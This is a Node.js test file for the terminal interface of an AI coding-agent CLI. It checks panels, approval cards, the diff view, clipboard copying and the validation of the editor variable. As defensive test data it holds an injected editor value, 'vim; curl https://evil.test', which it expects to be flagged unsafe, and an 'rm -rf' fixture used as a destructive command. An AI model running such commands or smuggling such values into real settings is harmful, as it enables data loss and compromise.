import assert from "node:assert/strict";
import { promises as fs } from "node:fs";
import { createRequire } from "node:module";
import path from "node:path";
import test from "node:test";
import { pathToFileURL } from "node:url";
import { importCore, importSource, REPO_ROOT } from "./support/core.mjs";
import { withTempDirectory } from "./support/helpers.mjs";

const requireFromCli = createRequire(
  pathToFileURL(path.join(REPO_ROOT, "packages", "cli", "package.json")),
);
const { stripTerminalSequences, visibleWidth } = await import(
  pathToFileURL(requireFromCli.resolve("@earendil-works/pi-tui")).href
);

const core = await importCore();
const { frameLines, viewportScrollbar } = await importSource(
  "packages/cli/src/tui/components/frame.ts",
);
const { renderHeader, renderStatus, formatContextBar } = await importSource(
  "packages/cli/src/tui/chrome/statusline.ts",
);
const { formatWorkWidgetLines } = await importSource(
  "packages/cli/src/tui/chrome/work-widget.ts",
);
const { formatWelcomeLines } = await importSource(
  "packages/cli/src/tui/chrome/welcome.ts",
);
const { ApprovalCard, approvalRiskLevel } = await importSource(
  "packages/cli/src/tui/components/approval-card.ts",
);
const { QuestionCard } = await importSource(
  "packages/cli/src/tui/components/question-card.ts",
);
const { CommandPalette } = await importSource(
  "packages/cli/src/tui/components/command-palette.ts",
);
const { HelpBrowser, extractHelpSlashCommand } = await importSource(
  "packages/cli/src/tui/components/help-browser.ts",
);
const { DiffView } = await importSource(
  "packages/cli/src/tui/components/diff-view.ts",
);
const { CommitCard } = await importSource(
  "packages/cli/src/tui/components/commit-card.ts",
);
const { ContextPanel } = await importSource(
  "packages/cli/src/tui/components/context-panel.ts",
);
const { EvidenceInspector } = await importSource(
  "packages/cli/src/tui/components/evidence-inspector.ts",
);
const { TrustPanel } = await importSource(
  "packages/cli/src/tui/components/trust-panel.ts",
);
const { MemoryBrowser } = await importSource(
  "packages/cli/src/tui/components/memory-browser.ts",
);
const { CapabilitiesPanel } = await importSource(
  "packages/cli/src/tui/components/capabilities-panel.ts",
);
const { createDoctorPanel } = await importSource(
  "packages/cli/src/tui/components/inspect-panels.ts",
);
const { editRenderers, writeRenderers, bashRenderers } = await importSource(
  "packages/cli/src/tui/renderers/index.ts",
);

const WIDTHS = [1, 8, 12, 24, 48, 80, 120];
const THEME = {
  bold: (text) => text,
  fg: (_color, text) => text,
};
const TAGGED_THEME = {
  bold: (text) => `<b>${text}</b>`,
  fg: (color, text) => `<${color}>${text}</${color}>`,
};
const KEYBINDINGS = {
  matches: (data, keybinding) =>
    keybinding === "tui.select.cancel" && data === "\u001b",
};

function assertWidthSafe(lines, width) {
  for (const line of lines) {
    assert.ok(
      visibleWidth(line) <= width,
      `visible width ${visibleWidth(line)} exceeds ${width}: ${JSON.stringify(line)}`,
    );
  }
}

test("P0: frameLines renders rounded corners, tone colors, and scrollbar thumb", () => {
  const lines = frameLines(
    {
      title: "codepunk alert",
      body: ["line 1", "line 2", "line 3", "line 4"],
      footer: "esc close",
      tone: "warning",
      scrollbar: viewportScrollbar({
        visible: ["line 1", "line 2", "line 3", "line 4"],
        offset: 0,
        total: 12,
        scrollable: true,
      }),
    },
    40,
    TAGGED_THEME,
  );
  assert.match(lines[0], /<warning>╭─<\/warning>/u);
  assert.match(lines[0], /<b><warning> codepunk alert <\/warning><\/b>/u);
  assert.match(lines.at(-1), /<warning>╰─+╯<\/warning>/u);
  assert.ok(lines.some((line) => line.includes("┃")));
  for (const width of WIDTHS) {
    assertWidthSafe(
      frameLines(
        {
          title: "codepunk alert",
          body: ["a", "b", "c"],
          footer: "esc close",
          tone: "error",
          scrollbar: { offset: 2, visibleCount: 3, total: 10 },
        },
        width,
        THEME,
      ),
      width,
    );
  }
});

test("P0: renderHeader and renderStatus support semantic colors, progress bar, and responsive widths", () => {
  const fakeRuntime = {
    session: { sessionId: "01TESTSESSION12345", allEvents: [] },
    paths: { deliveryRoot: "/workspace/demo" },
    config: {
      model: { provider: "openai", id: "gpt-5" },
      approval: { mode: "auto" },
      autonomy: { profile: "ask" },
      sandbox: { mode: "required" },
      filesystem: { mode: "workspace" },
      budget: { max_tokens: null, max_cost_usd: null },
      tui: { statusline: ["policy", "budget"], widgets: true },
    },
    workspaceTrust: {
      trusted: true,
      mode: "all",
      source: "saved",
      savedPath: "/tmp/trust.json",
      available: ["config", "policy", "skills", "instructions"],
      grants: { config: true, policy: true, skills: true, instructions: true },
    },
    sandbox: { sandboxed: true },
    shellPreflightIssue: null,
    mcpStatus: "ready",
    ledger: { all: [] },
    planMode: { state: () => ({ mode: "planning" }) },
    usage: () => ({ totalTokens: 0, costUsd: 0, calls: 0 }),
    host: {
      session: {
        model: { provider: "openai", id: "gpt-5" },
        messages: [],
        getContextUsage: () => ({
          tokens: 80000,
          contextWindow: 100000,
          percent: 80,
        }),
      },
    },
  };
  const state = {
    runtime: fakeRuntime,
    channel: { attach() {} },
    subagents: new Map(),
  };

  const wideHeader = renderHeader(state, { theme: TAGGED_THEME, width: 120 });
  assert.match(wideHeader, /<b><accent>codepunk<\/accent><\/b>/u);
  assert.match(wideHeader, /\[PLAN\]/u);
  assert.match(wideHeader, /Alt\+K palette/u);

  const compactHeader = renderHeader(state, { theme: THEME, width: 70 });
  assert.match(compactHeader, /codepunk · openai\/gpt-5 · \[PLAN\]/u);
  assert.doesNotMatch(compactHeader, /Alt\+K palette/u);

  const status = renderStatus(state, { theme: TAGGED_THEME, width: 120 });
  assert.match(status, /<success>trust trusted/u);
  assert.match(status, /<success>shell srt<\/success>/u);
  assert.match(status, /ctx 80% █████░ \(\/compact\)/u);
  assert.equal(formatContextBar(50, 8), "████░░░░");

  const workLines = formatWorkWidgetLines(fakeRuntime, TAGGED_THEME);
  assert.ok(workLines && workLines.some((line) => line.includes("PLAN MODE")));
  const welcome = formatWelcomeLines(fakeRuntime, TAGGED_THEME);
  assert.equal(welcome.length, 2);
  assert.match(welcome[0], /demo/u);
  assert.match(welcome[1], /Alt\+K palette/u);
});

test("P0: ApprovalCard classifies risk and scrolls long details without hiding choices", () => {
  const highRiskReq = {
    request_id: "req-1",
    session_id: "sess-1",
    worker_id: "w-1",
    tool_call_id: "tc-1",
    channel_id: "tui",
    nonce_sha256: "abc",
    tool: "bash",
    command: "rm -rf /tmp/demo",
    argv: ["rm", "-rf", "/tmp/demo"],
    cwd: "/workspace",
    reason: "destructive command",
    coverage_preview: "no srt sandbox; this command runs directly",
    diff_preview: Array.from({ length: 40 }, (_, i) => `+line ${i + 1}`).join(
      "\n",
    ),
    created_at: "2026-01-01T00:00:00Z",
    expires_at: "2026-01-01T00:01:00Z",
  };
  assert.equal(approvalRiskLevel(highRiskReq), "high");
  const card = new ApprovalCard(
    {
      request: highRiskReq,
      choices: [
        { key: "a", label: "Allow once", decision: "allow", scope: "once" },
        { key: "d", label: "Deny", decision: "deny", scope: "once" },
      ],
      workspaceTrusted: true,
      viewportHeight: 14,
    },
    THEME,
    KEYBINDINGS,
    () => {},
  );
  const first = card.render(80).join("\n");
  assert.match(first, /\[HIGH · UNCOVERED\]/u);
  assert.match(first, /> a  Allow once/u);
  assert.match(first, /PgUp\/PgDn scroll/u);
  card.handleInput("\u001b[6~");
  const scrolled = card.render(80).join("\n");
  assert.notEqual(scrolled, first);
  assert.match(scrolled, /> a  Allow once/u);
  for (const width of WIDTHS) {
    assertWidthSafe(card.render(width), width);
    card.invalidate();
  }
});

test("P0: QuestionCard stays bounded and scrollable on small viewports", () => {
  const card = new QuestionCard(
    {
      question: "Pick a deployment target\n".repeat(12),
      options: Array.from({ length: 6 }, (_, i) => ({
        label: `Option ${i + 1}`,
        description: `Details for option ${i + 1}`,
      })),
      allowFreeform: true,
    },
    THEME,
    KEYBINDINGS,
    () => {},
    10,
  );
  const rendered = card.render(60);
  assert.ok(rendered.length <= 15);
  for (const width of WIDTHS) {
    assertWidthSafe(card.render(width), width);
    card.invalidate();
  }
});

test("P1: CommandPalette fuzzy-filters, navigates, and dispatches selection", () => {
  let picked = null;
  const palette = new CommandPalette(
    {
      items: [
        {
          id: "git:diff",
          category: "Git",
          label: "Working tree diff",
          shortcut: "/diff",
        },
        {
          id: "inspect:context",
          category: "Inspect",
          label: "Context breakdown",
          shortcut: "/context",
        },
        {
          id: "config:theme",
          category: "Config",
          label: "Switch TUI theme",
          shortcut: "/settings",
        },
      ],
      viewportHeight: 12,
    },
    THEME,
    KEYBINDINGS,
    (id) => {
      picked = id;
    },
  );
  for (const width of WIDTHS) {
    assertWidthSafe(palette.render(width), width);
    palette.invalidate();
  }
  palette.handleInput("theme");
  const filtered = palette.render(80).join("\n");
  assert.match(filtered, /Switch TUI theme/u);
  palette.handleInput("\r");
  assert.equal(picked, "config:theme");
});

test("P1: HelpBrowser supports initialQuery and Enter command execution", () => {
  let selected = null;
  assert.equal(extractHelpSlashCommand("  /diff   show git diff"), "/diff");
  const browser = new HelpBrowser(
    {
      title: "Codepunk help",
      text: "Project\n  /diff    show changes\n  /context show context\n",
      initialQuery: "context",
      onSelectCommand: (cmd) => {
        selected = cmd;
      },
    },
    THEME,
    KEYBINDINGS,
    () => {},
  );
  const text = browser.render(80).join("\n");
  assert.match(text, /Filter: context/u);
  assert.match(text, /▸ \/context/u);
  browser.handleInput("\r");
  assert.equal(selected, "/context");
});

test("P1: DiffView supports mode tabs, hunk jump, and quick actions", () => {
  let triggered = null;
  const view = new DiffView(
    {
      title: "Working tree diff",
      source: {
        root: "/workspace",
        status: "M a.ts\nM b.ts",
        stat: " a.ts | 2 +-\n b.ts | 2 +-",
        staged: "diff --git a/a.ts b/a.ts\n@@ -1 +1 @@\n-old\n+staged-new",
        unstaged: "diff --git a/b.ts b/b.ts\n@@ -1 +1 @@\n-old\n+unstaged-new",
        untracked: [],
        truncated: false,
      },
      viewportHeight: 10,
      onAction: (action) => {
        triggered = action;
      },
    },
    THEME,
    KEYBINDINGS,
    () => {},
  );
  assert.match(view.render(80).join("\n"), /\[All\]/u);
  view.handleInput("\t");
  const staged = view.render(80).join("\n");
  assert.match(staged, /\[Staged\]/u);
  assert.match(staged, /\+staged-new/u);
  assert.doesNotMatch(staged, /\+unstaged-new/u);
  view.handleInput("\t");
  assert.match(view.render(80).join("\n"), /\[Unstaged\]/u);
  view.handleInput("\t");
  assert.match(view.render(80).join("\n"), /\[Stat\]/u);
  view.handleInput("c");
  assert.equal(triggered, "commit");
});

test("P1/P2: CommitCard, ContextPanel, EvidenceInspector, TrustPanel, MemoryBrowser, CapabilitiesPanel, and DoctorPanel render cleanly", () => {
  let committedStage = null;
  const commit = new CommitCard(
    {
      message: "feat: polish tui",
      preview: {
        root: "/workspace",
        branch: "main",
        head: "abcdef1234567890",
        staged: ["a.ts"],
        unstaged: ["b.ts"],
        untracked: [],
        staged_stat: "a.ts | 1 +",
        unstaged_stat: "b.ts | 2 +-",
      },
      choices: [
        { label: "Commit staged changes only (1)", value: "staged" },
        { label: "Stage tracked changes and commit (1)", value: "tracked" },
      ],
    },
    THEME,
    KEYBINDINGS,
    (stage) => {
      committedStage = stage;
    },
  );
  assert.match(commit.render(80).join("\n"), /Commit scope/u);
  commit.handleInput("\r");
  assert.match(commit.render(80).join("\n"), /Create this commit\?/u);
  commit.handleInput("\r");
  assert.equal(committedStage, "staged");

  let contextAction = null;
  const contextPanel = new ContextPanel(
    {
      usedTokens: 12000,
      contextWindow: 100000,
      percent: 12,
      compactionMode: "auto",
      compactionThreshold: 0.85,
      categories: [
        {
          label: "System & rules",
          tokens: 1000,
          color: "accent",
          detail: "core",
        },
        {
          label: "Conversation",
          tokens: 9000,
          color: "text",
          detail: "3 turns",
        },
        {
          label: "Tool outputs",
          tokens: 2000,
          color: "warning",
          detail: "2 results",
        },
      ],
    },
    THEME,
    KEYBINDINGS,
    (action) => {
      contextAction = action;
    },
  );
  assert.match(contextPanel.render(80).join("\n"), /12,000 \/ 100,000/u);
  contextPanel.handleInput("c");
  assert.equal(contextAction, "compact");

  const evidence = new EvidenceInspector(
    {
      records: [
        {
          id: "ev_1",
          seq: 1,
          tool: "bash",
          decision: "deny",
          outcome: "denied",
          rule: "shell.deny",
          coverage: "uncovered",
          coverage_basis: ["host"],
          sandbox: { backend: "none", version: null, profile_sha256: null },
          duration_ms: 12,
          exit_code: null,
          command: "curl https://example.com",
          path_check: { performed: false, target: null },
          cwd: "/workspace",
          output_sha256: "sha256:1234567890abcdef",
          output_preview: "denied",
        },
      ],
      head: "sha256:1234567890abcdef",
    },
    THEME,
    KEYBINDINGS,
    () => {},
  );
  assert.match(evidence.render(80).join("\n"), /curl https:\/\/example\.com/u);
  evidence.handleInput("\r");
  assert.match(evidence.render(80).join("\n"), /Evidence #1 · bash/u);
  evidence.handleInput("\u001b");
  evidence.handleInput("f");
  assert.match(evidence.render(80).join("\n"), /filter: denied/u);

  let savedGrants = null;
  const trust = new TrustPanel(
    {
      summaryLines: ["project resources: none"],
      initialGrants: {
        config: false,
        policy: false,
        skills: false,
        instructions: true,
      },
    },
    THEME,
    KEYBINDINGS,
    (grants) => {
      savedGrants = grants;
    },
  );
  trust.handleInput(" ");
  trust.handleInput("\r");
  assert.deepEqual(savedGrants, {
    config: true,
    policy: false,
    skills: false,
    instructions: true,
  });

  let memAction = null;
  const memory = new MemoryBrowser(
    {
      entries: [
        { id: "mem_1", scope: "project", content: "prefer pnpm verify" },
        { id: "mem_2", scope: "user", content: "use concise replies" },
      ],
    },
    THEME,
    KEYBINDINGS,
    (action) => {
      memAction = action;
    },
  );
  memory.handleInput("pnpm");
  assert.match(memory.render(80).join("\n"), /prefer pnpm verify/u);
  memory.handleInput("\u0001");
  assert.deepEqual(memAction, {
    action: "archive",
    id: "mem_1",
    scope: "project",
  });

  let capAction = null;
  const caps = new CapabilitiesPanel(
    {
      title: "codepunk plugins",
      summary: "Plugins (disabled, 0 files)",
      items: [],
      emptyText: "none",
      notes: ["run /reload after changes"],
      allowPluginToggle: true,
      pluginsEnabled: false,
    },
    THEME,
    KEYBINDINGS,
    (action) => {
      capAction = action;
    },
  );
  assert.match(caps.render(80).join("\n"), /e enable plugins/u);
  caps.handleInput("e");
  assert.equal(capAction, "toggle-plugins");

  const doctor = createDoctorPanel(
    {
      ok: false,
      platform: "darwin",
      codepunkHome: "/tmp/home",
      checks: [
        { id: "node", status: "ok", message: "Node 22", hint: null },
        {
          id: "srt",
          status: "error",
          message: "missing sandbox",
          hint: "install srt",
        },
      ],
    },
    THEME,
    KEYBINDINGS,
    () => {},
  );
  const doctorText = doctor.render(80).join("\n");
  assert.match(doctorText, /✗ \[error\] srt: missing sandbox/u);
  assert.match(doctorText, /✓ \[ok\] node: Node 22/u);
  for (const component of [
    commit,
    contextPanel,
    evidence,
    trust,
    memory,
    caps,
    doctor,
  ]) {
    for (const width of WIDTHS) {
      assertWidthSafe(component.render(width), width);
      component.invalidate();
    }
  }
});

test("P2: edit, write, and bash renderers summarize cleanly and stay width-safe", () => {
  const ctx = (args, isError = false) => ({
    args,
    argsComplete: true,
    cwd: "/workspace",
    isError,
    lastComponent: undefined,
  });
  const editCall = editRenderers.renderCall(
    { path: "/workspace/src/app.ts", edits: [{}, {}] },
    THEME,
    ctx({ path: "/workspace/src/app.ts" }),
  );
  const editRes = editRenderers.renderResult(
    {
      content: [{ type: "text", text: "ok" }],
      details: { diff: "--- a\n+++ b\n-old\n+new1\n+new2" },
    },
    { expanded: false, isPartial: false },
    THEME,
    ctx({ path: "/workspace/src/app.ts" }),
  );
  assert.match(
    stripTerminalSequences(editCall.render(80).join("\n")),
    /edit · src\/app\.ts · 2 changes/u,
  );
  assert.match(
    stripTerminalSequences(editRes.render(80).join("\n")),
    /edit ✓ src\/app\.ts · \+2 -1/u,
  );

  const writeRes = writeRenderers.renderResult(
    { content: [{ type: "text", text: "wrote" }], details: {} },
    { expanded: false, isPartial: false },
    THEME,
    ctx({ path: "/workspace/notes.md", content: "a\nb\nc" }),
  );
  assert.match(
    stripTerminalSequences(writeRes.render(80).join("\n")),
    /write ✓ notes\.md · \+3 lines/u,
  );

  const bashRes = bashRenderers.renderResult(
    {
      content: [{ type: "text", text: "hello\nworld" }],
      details: { exitCode: 0 },
    },
    { expanded: false, isPartial: false },
    THEME,
    ctx({ command: "echo hi" }),
  );
  assert.match(
    stripTerminalSequences(bashRes.render(80).join("\n")),
    /bash ✓ · 2 lines · hello/u,
  );
});

test("P0: writeUserTuiPreferences persists valid tui.theme and rejects invalid names", async () => {
  await withTempDirectory("codepunk-theme-pref-", async (home) => {
    const paths = { home };
    const configPath = await core.writeUserTuiPreferences(paths, {
      theme: "light",
    });
    const raw = await fs.readFile(configPath, "utf8");
    assert.match(raw, /theme = "light"/u);
    await assert.rejects(
      () => core.writeUserTuiPreferences(paths, { theme: "bad theme!" }),
      /tui\.theme/u,
    );
  });
});

test("Ergonomics: /copy extracts replies and code blocks and supports native + OSC 52 clipboard", async () => {
  const { parseCopySelector, extractAssistantReplyText, copyTextToClipboard } =
    await importSource("packages/cli/src/tui/commands/copy.ts");

  assert.deepEqual(parseCopySelector(""), { kind: "reply", index: 1 });
  assert.deepEqual(parseCopySelector("last"), { kind: "reply", index: 1 });
  assert.deepEqual(parseCopySelector("2"), { kind: "reply", index: 2 });
  assert.deepEqual(parseCopySelector("code"), { kind: "code", index: 1 });
  assert.deepEqual(parseCopySelector("code 2"), { kind: "code", index: 2 });
  assert.equal(parseCopySelector("0"), null);
  assert.equal(parseCopySelector("invalid arg"), null);

  const messages = [
    { role: "user", content: [{ type: "text", text: "hi" }] },
    {
      role: "assistant",
      content: [
        {
          type: "text",
          text: "First reply\n```ts\nconst a = 1;\n```",
        },
      ],
    },
    {
      role: "assistant",
      content: [
        {
          type: "text",
          text: 'Second reply\n```sh\npnpm test\n```\n```json\n{"ok":true}\n```',
        },
      ],
    },
  ];
  assert.match(
    extractAssistantReplyText(messages, { kind: "reply", index: 1 }),
    /^Second reply/u,
  );
  assert.match(
    extractAssistantReplyText(messages, { kind: "reply", index: 2 }),
    /^First reply/u,
  );
  assert.equal(
    extractAssistantReplyText(messages, { kind: "code", index: 1 }),
    '{"ok":true}',
  );
  assert.equal(
    extractAssistantReplyText(messages, { kind: "code", index: 2 }),
    "pnpm test",
  );
  assert.equal(
    extractAssistantReplyText(messages, { kind: "code", index: 3 }),
    "const a = 1;",
  );
  assert.equal(
    extractAssistantReplyText(messages, { kind: "code", index: 9 }),
    null,
  );

  const nativeCopied = copyTextToClipboard("hello", {
    platform: "darwin",
    env: {},
    execClipboard: (cmd, _args, text) => cmd === "pbcopy" && text === "hello",
  });
  assert.deepEqual(nativeCopied, { ok: true, method: "native" });

  let oscSeq = "";
  const sshOsc = copyTextToClipboard("ssh-text", {
    platform: "linux",
    isTTY: true,
    env: { SSH_TTY: "/dev/pts/0" },
    execClipboard: () => {
      throw new Error("native clipboard must not run over SSH");
    },
    writeOsc52: (seq) => {
      oscSeq = seq;
    },
  });
  assert.deepEqual(sshOsc, { ok: true, method: "osc52" });
  assert.equal(
    oscSeq,
    `\u001b]52;c;${Buffer.from("ssh-text").toString("base64")}\u0007`,
  );
});

test("Ergonomics: /editor validates $VISUAL/$EDITOR safely and preserves user markdown headings", async () => {
  const { resolveExternalEditor, buildEditorBuffer, stripEditorComments } =
    await importSource("packages/cli/src/tui/commands/editor.ts");

  assert.deepEqual(resolveExternalEditor({}), { kind: "builtin" });
  assert.deepEqual(
    resolveExternalEditor({ VISUAL: "code --wait", EDITOR: "vim" }),
    { kind: "external", argv: ["code", "--wait"], raw: "code --wait" },
  );
  assert.equal(
    resolveExternalEditor({ EDITOR: "vim; curl https://evil.test" }).kind,
    "unsafe",
  );

  const buf = buildEditorBuffer(
    "# Refactor Plan\n- Step 1",
    "Previous reply line",
  );
  assert.equal(stripEditorComments(buf), "# Refactor Plan\n- Step 1");
});

test("Ergonomics: command palette opens inspect overlays directly without session.prompt, /plan handles lifecycle subcommands, and attention bell respects cancel/opt-out", async () => {
  const { openCommandPalette } = await importSource(
    "packages/cli/src/tui/commands/palette.ts",
  );
  const { planCommand } = await importSource(
    "packages/cli/src/tui/commands/project.ts",
  );
  const { startAttentionBellTimer } = await importSource(
    "packages/cli/src/tui/approval/attention-bell.ts",
  );

  let promptCalled = false;
  let customCalls = 0;
  let modeState = { mode: "off", plan_sha256: null };
  const fakeRuntime = {
    session: { sessionId: "01ERGONOMICS", allEvents: [] },
    paths: { deliveryRoot: "/workspace/demo", home: "/tmp/cp-home" },
    config: {
      model: { provider: "openai", id: "gpt-5" },
      approval: { mode: "ask", reviewer: { mode: "off", timeout_ms: 5000 } },
      autonomy: { profile: "ask" },
      sandbox: { mode: "required", network_allow: [], network_deny: [] },
      filesystem: { mode: "workspace" },
      budget: { max_tokens: null, max_cost_usd: null },
      tui: { theme: "codepunk", statusline: ["policy"], widgets: false },
    },
    workspaceTrust: {
      trusted: true,
      mode: "all",
      source: "saved",
      savedPath: "/tmp/trust.json",
      available: ["config"],
      grants: { config: true, policy: true, skills: true, instructions: true },
    },
    sandbox: { sandboxed: true },
    shellPreflightIssue: null,
    mcpStatus: "ready",
    mcpServers: [],
    ledger: { all: [], head: null },
    planMode: {
      state: () => modeState,
      async enter() {
        modeState = { mode: "planning", plan_sha256: null };
        return modeState;
      },
      async approve() {
        modeState = { mode: "approved", plan_sha256: "sha256:1234" };
        return modeState;
      },
      async exit() {
        modeState = { mode: "off", plan_sha256: null };
        return modeState;
      },
    },
    usage: () => ({ totalTokens: 0, costUsd: 0, calls: 0 }),
    host: {
      session: {
        model: { provider: "openai", id: "gpt-5" },
        messages: [],
        getContextUsage: () => ({
          tokens: 100,
          contextWindow: 1000,
          percent: 10,
        }),
        async prompt() {
          promptCalled = true;
        },
      },
    },
  };
  const state = {
    runtime: fakeRuntime,
    channel: { attach() {} },
    subagents: new Map(),
  };
  const notices = [];
  const context = {
    ui: {
      async custom(factory) {
        customCalls += 1;
        if (customCalls === 1) {
          return "inspect:evidence";
        }
        let closed = false;
        factory(
          { stop() {}, start() {}, requestRender() {} },
          THEME,
          KEYBINDINGS,
          () => {
            closed = true;
          },
        );
        assert.equal(closed, false);
        return undefined;
      },
      notify(message, level) {
        notices.push({ message, level });
      },
      setStatus() {},
      setWidget() {},
    },
  };

  await openCommandPalette(state, context);
  assert.equal(customCalls, 2);
  assert.equal(promptCalled, false);

  const plan = planCommand(state);
  await plan.handler("on", context);
  assert.equal(modeState.mode, "planning");
  await plan.handler("approve", context);
  assert.equal(modeState.mode, "approved");
  await plan.handler("off", context);
  assert.equal(modeState.mode, "off");
  assert.equal(promptCalled, false);

  const bells = [];
  const stopFast = startAttentionBellTimer({
    delayMs: 50,
    isTTY: true,
    env: {},
    write: (chunk) => bells.push(chunk),
  });
  stopFast();
  await new Promise((resolve) => setTimeout(resolve, 70));
  assert.equal(bells.length, 0);

  const stopSlow = startAttentionBellTimer({
    delayMs: 50,
    isTTY: true,
    env: {},
    write: (chunk) => bells.push(chunk),
  });
  await new Promise((resolve) => setTimeout(resolve, 75));
  stopSlow();
  assert.deepEqual(bells, ["\u0007"]);

  const disabledBells = [];
  startAttentionBellTimer({
    delayMs: 50,
    isTTY: true,
    env: { CODEPUNK_NO_BELL: "1" },
    write: (chunk) => disabledBells.push(chunk),
  });
  await new Promise((resolve) => setTimeout(resolve, 70));
  assert.equal(disabledBells.length, 0);
});
